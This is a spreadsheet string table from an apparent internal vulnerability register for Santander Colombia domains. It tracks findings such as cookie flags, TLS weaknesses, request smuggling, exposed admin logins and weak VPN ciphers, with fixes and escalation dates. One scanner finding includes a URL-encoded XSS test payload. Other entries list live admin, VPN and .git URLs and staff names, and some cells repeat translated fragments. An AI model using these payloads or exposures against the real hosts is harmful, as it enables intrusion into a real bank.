    <t>MAN-33d542f4</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-CO-003</t>
  </si>
  <si>
    <t>Fuga de información de servidor</t>
  </si>
  <si>
    <t>Se ha comprobado que el encabezado “Server” en la respuesta de la aplicación revela información del servidor web en uso.
La información revelada por este encabezado es:
• server: openresty</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para su desarrollo o de la infraestructura que la sustenta. Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto. En concreto, se recomienda retirar el encabezado “Server” de la respuesta HTML.</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.</t>
  </si>
  <si>
    <t>1° Fecha: 15/12/2023</t>
  </si>
  <si>
    <t>Escalado: 20/12/2022
Escalado: 27/02/2023</t>
  </si>
  <si>
    <t>MAN-33d5ae0c</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-CO-004</t>
  </si>
  <si>
    <t>TLS MAC Calculation Timing attack (LUCKY13)</t>
  </si>
  <si>
    <t>La vulnerabilidad de TLS MAC Calculation Timing Attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC
Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado.</t>
  </si>
  <si>
    <t>Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor.</t>
  </si>
  <si>
    <t>Escalado: 20/12/2022
Escalado: 27/02/2023
Escalado: 03/03/20203
Escalado: 12/12/2024</t>
  </si>
  <si>
    <t>MAN-33d542f6</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-CO-006</t>
  </si>
  <si>
    <t>La vulnerabilidad de potencial Rate Limiter no implementado hace referencia al faltante de un limitador de velocidad para evitar que el sistema sea vulnerable a ataques de tipo DoS.
Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 80 peticiones en un segundo.</t>
  </si>
  <si>
    <t>HELICOPTER-W388-1</t>
  </si>
  <si>
    <t>Using vulnerable javascript library</t>
  </si>
  <si>
    <t>CVE-2011-4969
CVE-2012-6708
CVE-2019-11358</t>
  </si>
  <si>
    <t xml:space="preserve">Las bibliotecas comunes de JavaScript suelen disfrutar de la ventaja de estar muy auditadas. Esto puede significar que los
rápidamente identificados y parcheados, lo que resulta en un flujo constante de actualizaciones de seguridad que necesitan ser
aplicar. Aunque puede ser tentador ignorar las actualizaciones, usar una librería a la que le faltan parches de seguridad puede hacer que su sitio web sea excepcionalmente fácil de explotar.
su sitio web excepcionalmente fácil de explotar. Por lo tanto, es importante asegurarse de que las actualizaciones de seguridad disponibles se aplican con prontitud.
de seguridad disponibles.
A partir de la evaluación de la aplicación web, se ha identificado que la aplicación utiliza una librería javascript vulnerable que es vulnerable a ataques XSS.
vulnerable a ataques XSS. La versión vulnerable podría encontrarse en el código javascript.
</t>
  </si>
  <si>
    <t>Desarrolle una estrategia de gestión de parches para garantizar que las actualizaciones de seguridad se aplican rápidamente a todas las bibliotecas de terceros de su aplicación.
de terceros en su aplicación. Además, considere la posibilidad de reducir la superficie de ataque eliminando las bibliotecas que ya no se utilicen.
en uso.</t>
  </si>
  <si>
    <t>El uso de bibliotecas JavaScript de terceros puede introducir una serie de vulnerabilidades basadas en DOM, incluyendo algunas
que pueden ser usadas para secuestrar cuentas de usuario como DOM-XSS.</t>
  </si>
  <si>
    <t>HELICOPTER-W388-4</t>
  </si>
  <si>
    <t>Admin Login Page Exposed</t>
  </si>
  <si>
    <t>Fuzzing y enumeración revelaron una página de inicio de sesión en
https://www.santander.com.co/Empresas/#/administrationGeneral/login que es el inicio de sesión backend CMS
expuesta al público. Esto viola la política de Santander que establece: "El cliente está particularmente interesado en cualquier
portales de administración expuestos para este activo, ya que va en contra de la política del Santander tenerlos expuestos en Internet,
tanto si están protegidos por contraseña como si no".</t>
  </si>
  <si>
    <t>Asegurar el directorio con un error 403 Forbidden, mientras que la lista blanca de direcciones IP específicas que se les permite acceder a este directorio, que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache).
acceder a este directorio, lo que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache y
nginx.conf para servidores nginx) o utilizando un Firewall de Aplicaciones Web.</t>
  </si>
  <si>
    <t>Si bien esto no es una amenaza inmediata, un panel de acceso administrativo expuesto y obvio puede hacer que sea
para los atacantes, especialmente si los controles de acceso se limitan a las combinaciones de nombre de usuario y contraseña.
de usuario y contraseña.</t>
  </si>
  <si>
    <t>HELICOPTER-W388-5</t>
  </si>
  <si>
    <t>Fuzzing y enumeración revelaron la página de inicio de sesión en https://www.santander.com.co/Web/Login.aspx?
ReturnUrl=%2fWeb%2f que es un inicio de sesión backend CMS expuesto al público. Esto viola la política de Santander
que establece: "El cliente está particularmente interesado en cualquier portal de administración expuesto para este activo, ya que va en contra de la política del Santander tenerlos expuestos en la red.
la política del Santander tenerlos expuestos en Internet, estén o no protegidos por contraseña".</t>
  </si>
  <si>
    <t>VPN</t>
  </si>
  <si>
    <t>MAN-6526b807</t>
  </si>
  <si>
    <t>CO-23-CNMPA-001-AP-001</t>
  </si>
  <si>
    <t>Cookies sin atributo HttpOnly</t>
  </si>
  <si>
    <t>vpnco2.santander.com.co</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:
• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad "HttpOnly", evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger.</t>
  </si>
  <si>
    <t>El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación.</t>
  </si>
  <si>
    <t>Victor Andres Aragon Valencia</t>
  </si>
  <si>
    <t>MAN-6526c243</t>
  </si>
  <si>
    <t>CO-23-CNMPA-001-CO-002</t>
  </si>
  <si>
    <t>Renegociación del Handshake en SSL/TLS</t>
  </si>
  <si>
    <t>El protocolo TLS y el protocolo SSL v3.0 no asocia apropiadamente la renegociación del Handshake
SSL en una conexión existente, lo que permite ataques man-in-the-middle en los que el atacante
inserta datos en sesiones HTTPS, y posiblemente otro tipo de sesiones protegidas por SSL o TLS,
enviando una petición de autenticación que es procesada retroactivamente por un servidor en un
contexto post-renegociación. Se trata de un ataque de "inyección de texto plano", también conocido
como el problema del "Proyecto Mogul".</t>
  </si>
  <si>
    <t>La mitigación de los ataques a certificado HTTPS del cliente es difícil e implica ventajas y desventajas. Una posible solución consiste en exigir la presentación de certificados de cliente de inmediato, antes de la presentación de la solicitud HTTP al servidor. Aunque es factible, la aplicación de esta función por el software de servidor web puede ser incompatible - mientras que el certificado que se le pida, el cliente puede, en algunos casos simplemente se niegan a responder con un certificado válido. En esos casos, el servidor puede recurrir a la comportamiento vulnerable. Este cambio también tiene el efecto secundario de transmisión de la cadena de certificado de cliente en el claro, mientras que antes estaba protegida dentro de la primera sesión cifrada.</t>
  </si>
  <si>
    <t>Un atacante remoto no autenticado puede ser capaz de aprovechar este problema para inyectar una cantidad arbitraria de texto sin formato en el principio de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle si el servicio asume las sesiones antes y después de la renegociación son del mismo 'cliente' y combina en la capa de aplicación.</t>
  </si>
  <si>
    <t>MAN-6526c244</t>
  </si>
  <si>
    <t>CO-23-CNMPA-001-CO-003</t>
  </si>
  <si>
    <t>Inadecuada configuración de la política CSP (Content-Security-Policy)</t>
  </si>
  <si>
    <t>Se ha identificado una configuración inadecuada de la política CSP permitiendo usar la política
default-src con valor self. En las siguientes imágenes se puede observar el encabezado “Content-
Security-Policy” configurado inadecuadamente</t>
  </si>
  <si>
    <t>Se recomienda establecer la cabecera strict-script: script-dynamic y definir la cabecera object-src 'none'.</t>
  </si>
  <si>
    <t>Sin una correcta configuración del encabezado CSP, es posible que un atacante abuse de otras vulnerabilidades, como XSS, para cargar recursos adicionales como scripts o exploits en los navegadores de las víctimas para aumentar los vectores de ataque que tienen a su disposición.</t>
  </si>
  <si>
    <t>MAN-23682f92</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-001</t>
  </si>
  <si>
    <t>Errores no controlados por la aplicación</t>
  </si>
  <si>
    <t>La ausencia de un correcto control de captura y manejo de errores en la aplicación presenta múltiples problemas de seguridad. La problemática más común suele ser la revelación de información interna en mensajes de error, tales como dumps o información interna de la base de datos, información específica de la tecnología utilizada, volcados de pila, etc.
Las pruebas realizadas sobre https://www.santander.com.co demuestran que es posible generar un error HTTP 403 enviando una petición HTTP a través del método PUT.
A continuación se muestran como el error HTTP 403 no capturado por el aplicativo revela la versión de Apache Tomcat 8.5.13 utilizada en el endpoint.</t>
  </si>
  <si>
    <t>Se deben capturar y controlar todas las excepciones producidas en la aplicación, o en los sistemas que las sustentan, evitando proporcionar información útil a un posible atacante. Adicionalmente, se recomienda personalizar las páginas de error HTTP 40x y 50x para que no sean descriptivas.</t>
  </si>
  <si>
    <t>Con esta información un atacante puede obtener información interna de la aplicación que se muestre en el error generado (Por ejemplo, volcados de pila) además de información interna sobre las tecnologías utilizadas para sustentar la aplicación en caso de que los errores producidos muestren información acerca del motivo del error. Dada esta información, el atacante podrá realizar ataques especialmente dirigidos, con mayor probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan.</t>
  </si>
  <si>
    <t>Pre:
1° Fecha: 16/08/2024
Pro:
1° Fecha: 21/09/2024</t>
  </si>
  <si>
    <t>MAN-415c99bd</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-002</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.
Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación http://www.santander.com.co revelan información interna acerca del Tipo de Servidor y/o infraestructura interna de la aplicación.
A continuación, se incluye evidencia de la exposición de la versión de Microsoft Internet Information Server 10.0 a través de la cabecera de respuesta “Server”</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. Para más información consulte en: https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Conocer la version y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable.</t>
  </si>
  <si>
    <t>1° Fecha: 09/08/2024
2° Fecha: 31/10/2024</t>
  </si>
  <si>
    <t>Se debe modificar una llave de registro en el servidor.</t>
  </si>
  <si>
    <t>MAN-23682f95</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-003</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie, es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario.
Durante las pruebas realizadas se ha observado que la cookie "dtCookie" no tiene aplicado el atributo de seguridad HttpOnly. Este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente.</t>
  </si>
  <si>
    <t>El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación.</t>
  </si>
  <si>
    <t>1° Fecha: 09/08/2024</t>
  </si>
  <si>
    <t>Reevaluada / Certificada</t>
  </si>
  <si>
    <t>MAN-23682f96</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-004</t>
  </si>
  <si>
    <t>Cookies sin atributo secure</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar con la finalidad de usurpar el identificador de sesión.
Durante las pruebas realizadas se ha observado que las cookie "dtCookie" no tiene aplicado el atributo de seguridad secure. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad "secure", evitando que el identificador de sesión pueda ser transmitido por canales no seguros. La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger.</t>
  </si>
  <si>
    <t>MAN-23682f97</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-005</t>
  </si>
  <si>
    <t>Vulnerabilidad tipo BREACH en compresión HTTP</t>
  </si>
  <si>
    <t>BREACH es una instancia del ataque CRIME contra la compresión HTTP de tipo gzip o DEFLATE a
través de la opción de la codificación de contenido dentro de HTTP. Este ataque se centra en la
realización de una búsqueda inicial de fuerza bruta ciega para adivinar unos pocos bytes, seguido
por una búsqueda de divide-y-vencerás para expandir un acierto a una gran cantidad de contenido
arbitraria.
Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece
compresión Gzip en sus conexiones. A continuación, se muestra una evidencia de que el activo es
vulnerable a BREACH:</t>
  </si>
  <si>
    <t>Como resultado, los clientes y los servidores están obligados, ya sea a desactivar la compresión HTTP por completo, reduciendo el rendimiento, o a adoptar soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como el uso de protección de falsificación de petición en sitios cruzados (CSRF). Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una petición entre sitios cruzados, o cuando la cabecera no está presente.5 Este enfoque permite una mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de rendimiento en las solicitudes afectadas.Como resultado, los clientes y los servidores están obligados, ya sea a desactivar la compresión HTTP por completo, reduciendo el rendimiento, o a adoptar soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como el uso de protección de falsificación de petición en sitios cruzados (CSRF).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como se desactivaría la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: • Deshabilite el módulo mod_deflate utilizando el siguiente comando: $ sudo a2dismod deflate • Reinicie el servidor: $ sudo /etc/init.d/apache2 restart Deshabilitar compresión en NGINX: • Establezca la configuración del host con la opción gzip en off: server { server_name www.example.com;
listen 443 ssl http2; gzip off; }</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre un cliente y el servidor, y con ello ver todas las comunicaciones entre ambos en claro (datos personales, credenciales de usuario...).</t>
  </si>
  <si>
    <t>MAN-23682f98</t>
  </si>
  <si>
    <t>SC-23-CNMPO-003-CO-006</t>
  </si>
  <si>
    <t>El servidor usa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(Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques. 
Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a LUCKY13. A continuación se muestran los resultados que verifican la vulnerabilidad.</t>
  </si>
  <si>
    <t>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hechos a mano, también conocido como el "Lucky Thirteen" de emisión. Un atacante puede aprovechar la vulnerabilidad indicada para descifrar el tráfico entre un cliente y el website y ver todo el intercambio de información que se produzca entre ellos.</t>
  </si>
  <si>
    <t>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 https://www.openssl.org/source/</t>
  </si>
  <si>
    <t>MAN-2367be63</t>
  </si>
  <si>
    <t>SC-23-CNMPO-002-AP-002</t>
  </si>
  <si>
    <t>Software Zoom Indexer desactualizado</t>
  </si>
  <si>
    <t>El protocolo TLS y el protocolo SSL v3.0 no asocia apropiadamente la renegociación del Handshake SSL en una conexión existente, lo que permite ataques man-in-the-middle en los que el atacante inserta datos en sesiones HTTPS, y posiblemente otro tipo de sesiones protegidas por SSL o TLS, enviando una petición de autenticación que es procesada retroactivamente por un servidor en un contexto post-renegociación. Se trata de un ataque de "inyección de texto plano", también conocido como el problema del "Proyecto Mogul".
se ha identificado la versión del software Zoom Indexer mediante la siguiente URL:
https://confirming-factoring.santander.com.co/factoring/ayuda/settings.js
el software indicado se ha podido confirmar que la última versión disponible sería la v8.0 build 1019.
Posteriormente, durante el análisis de la aplicación se ha identificado un posible DOM based XSS injection relacionado con el uso del software Zoom Indexer, concretamente analizando el código fuente del siguiente script:
https://confirming-factoring.santander.com.co/factoring/ayuda/zoom_search.js</t>
  </si>
  <si>
    <t>Utilizar un software desactualizado podría permitir a un atacante identificar dicho software y explotar cualquier vulnerabilidad conocida para tomar el control del activo analizado.</t>
  </si>
  <si>
    <t>certificada</t>
  </si>
  <si>
    <t>MAN-2367be67</t>
  </si>
  <si>
    <t>SC-23-CNMPO-004-AP-001</t>
  </si>
  <si>
    <t>Las vulnerabilidades de contrabando de solicitudes HTTP surgen cuando los sitios web enrutan solicitudes HTTP a través de servidores web con un análisis HTTP inconsistente. Al proporcionar una solicitud que diferentes servidores interpretan como de diferentes longitudes, un atacante puede envenenar el socket TCP/TLS de back-end y anteponer datos arbitrarios a la siguiente solicitud. Dependiendo de la funcionalidad del sitio web, esto se puede usar para eludir las reglas de seguridad de front-end, acceder a los sistemas internos, envenenar los cachés web y lanzar una variedad de ataques a los usuarios que navegan activamente por el sitio.
Es posible manipular las peticiones de forma enviadas al frontend, de forma que, al realizar una petición, recibamos la respuesta de otra petición que no corresponda a nuestra petición sino a una anterior.
se añade al final una petición nueva a un path inexistente: “GET /quo4pqqbqmyqwk39w3fdf67bv21wpndh95zspge HTTP/1.1”
la siguiente petición, el servidor le responda lo de la petición anterior, mostrando un error de recurso no encontrado “Not Found”, relativo al: “GET /quo4pqqbqmyqwk39w3fdf67bv21wpndh95zspge HTTP/1.1”
Esto puede servir para interceptar peticiones de otros usuarios pudiendo obtener datos sensibles como credenciales o datos personales.</t>
  </si>
  <si>
    <t>Puede resolver todas las variantes de esta vulnerabilidad configurando el servidor front-end para usar exclusivamente HTTP/2 cuando se comunique con sistemas back-end. Alternativamente, puede asegurarse de que todos los servidores de la cadena ejecuten el mismo software de servidor web con la misma configuración. Es probable que deshabilitar la reutilización de la conexión back-end reduzca el impacto de esta vulnerabilidad, pero no mitiga todas las posibles vulnerabilidades. Las instancias específicas de esta vulnerabilidad se pueden resolver reconfigurando el servidor front-end para normalizar las solicitudes ambiguas antes de enrutarlas. Como alternativa, puede configurar el servidor de back-end para rechazar el mensaje y cerrar la conexión cuando encuentre una solicitud ambigua.</t>
  </si>
  <si>
    <t>Cuando el servidor front-end reenvía solicitudes HTTP a un servidor back-end, normalmente envía varias solicitudes a través de la misma conexión de red back-end, porque esto es mucho más eficiente y eficaz. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente. En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes. De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpreten de manera diferente. El atacante hace que parte de su solicitud de front-end sea interpretada por el servidor de back-end como el inicio de la siguiente solicitud. Se antepone efectivamente a la siguiente solicitud y, por lo tanto, puede interferir con la forma en que la aplicación procesa esa solicitud. Este es un ataque de contrabando de solicitudes y puede tener resultados devastadores.</t>
  </si>
  <si>
    <t>Para revisión con SDS México</t>
  </si>
  <si>
    <t>MAN-2367be68</t>
  </si>
  <si>
    <t>SC-23-CNMPO-004-AP-002</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie, es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario.
se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:
• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente.
La siguiente captura demuestra la ausencia del atributo mencionado:
- https://www.santander.com.co/index.html</t>
  </si>
  <si>
    <t>Se realizará validación con el equipo de SDS México para revisar como podemos hacer la implementación</t>
  </si>
  <si>
    <t>MAN-2367be69</t>
  </si>
  <si>
    <t>SC-23-CNMPO-004-AP-003</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar con la finalidad de usurpar el identificador de sesión.
Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:
secure – este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs.
La siguiente cookie no establece el indicador de cookie secure:
https://www.santander.com.co/index.html</t>
  </si>
  <si>
    <t>QA-WAS-b54c5eae-5002-4518-b4c8-4298f33d2756</t>
  </si>
  <si>
    <t>Server Error Message</t>
  </si>
  <si>
    <t>Se ha encontrado un mensaje de error detallado durante la exploración.
https://www.santander.com.co/web/GenericErrorPage.htm?aspxerrorpath=%00%3Cscript%3Ealert(81)%3B_q%3Drandom(X170927088Y1_1Z)%3C%2Fscript%3E</t>
  </si>
  <si>
    <t>Implemente una gestión sólida de errores y excepciones para garantizar que la aplicación web sólo muestre mensajes de error genéricos. Evite devolver rastros de pila, información de depuración u otros detalles técnicos al cliente.  La aplicación también debe implementar una validación rigurosa de los datos de entrada. Restrinja los datos proporcionados por el usuario para que consistan en un conjunto mínimo de caracteres necesarios para el campo de entrada y valide los datos para asegurarse de que se ajustan al formato esperado.
Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator</t>
  </si>
  <si>
    <t>QA-WAS-42a024ed-0454-4712-b053-88afeaf2c0f5</t>
  </si>
  <si>
    <t>Vulnerable JavaScript Library Detected - jQuery</t>
  </si>
  <si>
    <t>jQuery es una biblioteca JavaScript diseñada para simplificar el recorrido y la manipulación del árbol DOM de HTML, así como la gestión de eventos, la animación CSS y Ajax.
La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F</t>
  </si>
  <si>
    <t>Consulte la información proporcionada en la sección de respuestas.  Consulte también los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca.</t>
  </si>
  <si>
    <t>Fecha de decomiso:
31/12/2023
RITM011127933</t>
  </si>
  <si>
    <t>QA-WAS-dc64856f-c91c-4dbf-bfc6-49ca21d81d17</t>
  </si>
  <si>
    <t>La aplicación web utiliza una o varias bibliotecas JavaScript que contienen una vulnerabilidad conocida.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F</t>
  </si>
  <si>
    <t>Consulte los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca.</t>
  </si>
  <si>
    <t>QA-WAS-82dc204a-5102-42ec-9e71-b4ecbdec7d46</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fWebService%2f</t>
  </si>
  <si>
    <t>Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso.</t>
  </si>
  <si>
    <t>QA-WAS-53b3624d-2d32-4f1a-aa08-4e0d17873e6c</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo HTTPOnly.
https://www.santander.com.co/</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo HTTPOnly a las cookies.</t>
  </si>
  <si>
    <t>QA-WAS-5789806b-30dd-4079-bb72-b510e54eeaa6</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo secure
https://www.santander.com.co/</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo seguro a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-1ef6b681-2f6a-4c62-b7db-3efdf56a1f97</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor 
https://www.santander.com.co/.git/config</t>
  </si>
  <si>
    <t>En revisión falso positivo
RITM011127883</t>
  </si>
  <si>
    <t>QA-WAS-890c1a25-09fc-4a8c-a657-964bc12305b2</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo HTTPOnly.
https://www.santander.com.co/Empresas/</t>
  </si>
  <si>
    <t>Juan David Cuesta</t>
  </si>
  <si>
    <t>QA-WAS-7f958928-4369-42b5-a250-f646ac8b4a7e</t>
  </si>
  <si>
    <t>Predictable Resource Location Via Forced Browsing</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web.
https://vpnco2.santander.com.co/+CSCOE+/message.html?mc=2</t>
  </si>
  <si>
    <t>Escalado: 26/07/2023</t>
  </si>
  <si>
    <t>Angie Cubillos</t>
  </si>
  <si>
    <t>QA-VM--2640472995955208740</t>
  </si>
  <si>
    <t>Weak IPsec Encryption Settings</t>
  </si>
  <si>
    <t>vpnbsnc.santander.com.co</t>
  </si>
  <si>
    <t>Este host contiene un servidor de intercambio de claves ISAKMP/IKE para negociar claves de cifrado para Redes Privadas Virtuales (VPNs) IPsec. La configuración del servidor permite a los clientes establecer conexiones VPN con configuraciones de cifrado o longitudes de clave inseguras. Una vez establecidas, estas conexiones pueden permitir a usuarios remotos malintencionados con acceso al flujo de datos de la VPN recuperar la clave de sesión utilizada en la conexión realizando búsquedas de fuerza bruta en el espacio de claves.
Nota:  
Este QID será reportado como una Vulnerabilidad Potencial (no como una Vulnerabilidad)
en algunas versiones de IOS porque un ISAKMP SA con configuraciones débiles puede ser
establecida primero, y rechazada después por una comprobación de políticas. Sin
tener credenciales de autenticación VPN, es imposible diferenciar
entre este tipo de configuración y una configuración que realmente permite ISAKMP SA con
débil 
débiles.
Algoritmo: DES
Descripción: Data_Encryption_Standard_(56_bits)</t>
  </si>
  <si>
    <t>esactive el algoritmo de cifrado "DES" (longitud de clave de 56 bits) y el algoritmo de intercambio de claves DH768 (MODP768). Los sustitutos seguros son 3DES y DH2048.
MSFT tiene más detalles en Microsoft Guidance
https://technet.microsoft.com/library/cc776369.aspx</t>
  </si>
  <si>
    <t>Un usuario malintencionado con acceso al flujo de datos de la VPN puede ser capaz de recuperar la clave de sesión de una conexión VPN. Esto le daría acceso a todos los datos enviados a través de la conexión VPN, que pueden incluir contraseñas y archivos confidenciales.</t>
  </si>
  <si>
    <t>RITM011128055
Escalado: 26/07/2023</t>
  </si>
  <si>
    <t>QA-WAS-83de7cee-1208-4119-9604-31ee90432e67</t>
  </si>
  <si>
    <t>HTTP Host Header Injection</t>
  </si>
  <si>
    <t>La cabecera Host es una cabecera de petición HTTP que especifica el nombre de dominio del servidor con el que el cliente intenta comunicarse. Permite a un único servidor web alojar varios sitios web distinguiendo entre ellos en función del nombre de dominio proporcionado en la cabecera Host.
La inyección del encabezado Host es una vulnerabilidad de seguridad que se produce cuando un atacante manipula el encabezado Host en una petición HTTP para inyectar datos maliciosos. Al hacerlo, el atacante puede engañar al servidor web para que procese la solicitud como si estuviera dirigida a un dominio diferente. Esto puede dar lugar a varios tipos de ataques, como desfiguración de sitios web, secuestro de sesiones y secuencias de comandos en sitios cruzados (XSS).
Lógica de detección de QID:
Este QID envía una petición HTTP con la carga útil en la cabecera Host para comprobar si el objetivo es vulnerable.
https://prospera.santanderconsumer.co/testlabwest2022/users</t>
  </si>
  <si>
    <t>Para mitigar los riesgos de la inyección de encabezados de host, es esencial implementar una validación y un saneamiento adecuados de los encabezados de entrada.</t>
  </si>
  <si>
    <t>QA-WAS-e8bd68a8-8453-4cac-916c-04b7dae26ce4</t>
  </si>
  <si>
    <t>La cabecera Host es una cabecera de petición HTTP que especifica el nombre de dominio del servidor con el que el cliente intenta comunicarse. Permite a un único servidor web alojar varios sitios web distinguiendo entre ellos en función del nombre de dominio proporcionado en la cabecera Host.
La inyección del encabezado Host es una vulnerabilidad de seguridad que se produce cuando un atacante manipula el encabezado Host en una petición HTTP para inyectar datos maliciosos. Al hacerlo, el atacante puede engañar al servidor web para que procese la solicitud como si estuviera dirigida a un dominio diferente. Esto puede dar lugar a varios tipos de ataques, como desfiguración de sitios web, secuestro de sesiones y secuencias de comandos en sitios cruzados (XSS).
Lógica de detección de QID:
Este QID envía una petición HTTP con la carga útil en la cabecera Host para comprobar si el objetivo es vulnerable.
https://www.santander.com.co/testlabwest2022/users</t>
  </si>
  <si>
    <t>QA-WAS-04fabc3f-5d65-4d31-acee-99ee949c357c</t>
  </si>
  <si>
